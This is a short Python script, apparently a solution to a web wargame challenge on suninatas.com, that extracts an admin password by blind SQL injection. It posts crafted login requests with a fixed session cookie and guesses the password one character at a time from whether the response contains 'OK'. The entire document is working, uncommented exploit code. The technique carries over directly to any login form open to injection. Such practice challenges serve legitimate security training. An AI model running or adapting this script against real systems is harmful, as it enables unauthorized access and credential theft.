from http import client

conn = client.HTTPConnection('suninatas.com',80)

headers={'Content-Type':'application/x-www-form-urlencoded',
         'Cookie':'ASPSESSIONIDQSQBCASC=BKKPBBHALMLFBNPAMGFJOLKC'}
url = '/Part_one/web22/web22.asp'

passwd = []

for i in range(1,11):
    for ascii_num in range(33,126):
        body="id=admin'and(substring(pw,%d,1)='"%i+chr(ascii_num)+"')--&pw=1234"
        conn.request('POST',url,body,headers)
        res=conn.getresponse()
        resData=res.read()
        strRes = str(resData)
        if(strRes.find("OK")>-1):
            passwd.append(chr(ascii_num))
            break
    print(passwd)

conn.close()
